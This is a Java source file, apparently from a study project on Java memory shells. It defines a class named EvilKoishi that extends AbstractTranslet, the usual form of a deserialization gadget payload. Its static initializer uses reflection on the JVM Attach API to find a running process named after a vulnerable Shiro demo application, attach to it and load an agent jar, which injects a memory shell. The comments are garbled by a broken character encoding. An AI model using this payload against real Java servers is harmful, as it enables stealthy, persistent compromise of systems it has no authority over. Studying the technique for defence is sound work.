import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class EvilKoishi extends AbstractTranslet {
    static {
        try {
            java.lang.String path = "R:\\languages\\Java\\study\\JavaMemShells\\AgentMaker\\src\\main\\java\\AgentMain-1.0-SNAPSHOT-jar-with-dependencies.jar";
            // �����������ʦ��github�ϵ�jar��������������Լ����ɵģ��Թ��˶����Դ�����Ȥ���űʼ�����������Լ�����һ��
            //path = "R:\\languages\\Java\\study\\JavaMemShells\\AgentMaker\\target\\AgentMaker-1.0-SNAPSHOT-jar-with-dependencies.jar";
            ClassLoader classLoader = ClassLoader.getSystemClassLoader();
            Class<?> MyVirtualMachine = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class<?> MyVirtualMachineDescriptor = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod("list", null);
            java.util.List/*<Object>*/ list = (java.util.List/*<Object>*/) listMethod.invoke(MyVirtualMachine, null);

            System.out.println("Running JVM list ...");
            for (int i = 0; i < list.size(); i++) {
                Object o = list.get(i);
                java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod("displayName", null);
                java.lang.String name = (java.lang.String) displayName.invoke(o, null);
                // �г���ǰ����Щ JVM ����������
                // ����� if ��������ʵ��������и���,����Ҳ�У�������ȫ���ĳ����ϣ�ͦ����˼
                if (name.contains("com.shiro.vuln.ShirodemoApplication")) {
                    // ��ȡ��Ӧ���̵� pid ��
                    java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod("id", null);
                    java.lang.String id = (java.lang.String) getId.invoke(o, null);
                    System.out.println("id >>> " + id);
                    java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod("attach", new Class[]{java.lang.String.class});
                    java.lang.Object vm = attach.invoke(o, new Object[]{id});
                    java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod("loadAgent", new Class[]{java.lang.String.class});
                    loadAgent.invoke(vm, new Object[]{path});
                    java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod("detach", null);
                    detach.invoke(vm, null);
                    System.out.println("Agent.jar Inject Success !!");
                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
